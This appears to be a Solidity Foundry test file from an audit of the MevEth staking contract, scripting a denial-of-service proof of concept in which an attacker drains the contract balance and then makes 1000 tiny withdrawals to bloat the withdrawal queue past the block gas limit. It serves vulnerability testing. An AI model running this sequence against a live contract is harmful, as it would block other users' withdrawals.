/// SPDX: License-Identifier: GPL-3.0-only
pragma solidity 0.8.19;

import "../MevEthTest.sol";

contract ReentrancyAttackTest is MevEthTest {
  function testDosAttackQueueLength() public {
    vm.deal(User01, 63 ether);
    vm.startPrank(User01);

    address stakingModuleAddress = address(mevEth.stakingModule());
    IStakingModule.ValidatorData memory validatorData = mockValidatorData(User01, 32 ether / 1 gwei);

    // 1. Attacker deposits 63 Eth to MevEth
    weth.deposit{ value: 63 ether }();
    weth.approve(address(mevEth), 63 ether);
    mevEth.deposit(63 ether, User01);
    assertEq(address(mevEth).balance, 63 ether);
    
    // 2. `createValidator()` is called -> MevEth balance 31 Ether
    vm.stopPrank();
    vm.startPrank(Operator01);
    mevEth.createValidator(validatorData);
    assertEq(address(mevEth).balance, 31 ether);

    vm.stopPrank();
    vm.startPrank(User01);
    // 3. Attackers withdraws 31 ETH -> MevEth balance 0 Ether
    mevEth.withdraw(31 ether, User01, User01);
    assertEq(address(mevEth).balance, 0 ether);

    // 4. Attackers shares are still worth 32 ether
    assertEq(mevEth.convertToAssets(mevEth.balanceOf(User01)), 32 ether);
  
    // ~10 blocks worth of txs
    for (uint i = 0; i < 1000; i++) {
      // Attacker withdraws 0.01 ETH worth of shares, but because contract has no balance left the queueLength increases by 1.
      // Attacker repeats step above many times.
      mevEth.withdraw(0.011 ether, User01, User01);
    }

    vm.stopPrank();
    vm.startPrank(User02);
    // Give mevEth enough ether to process all withdrawals
    vm.deal(address(mevEth), 100 ether);

    // Block gas limit
    mevEth.processWithdrawalQueue{gas: 30_000_000}();
  }
}
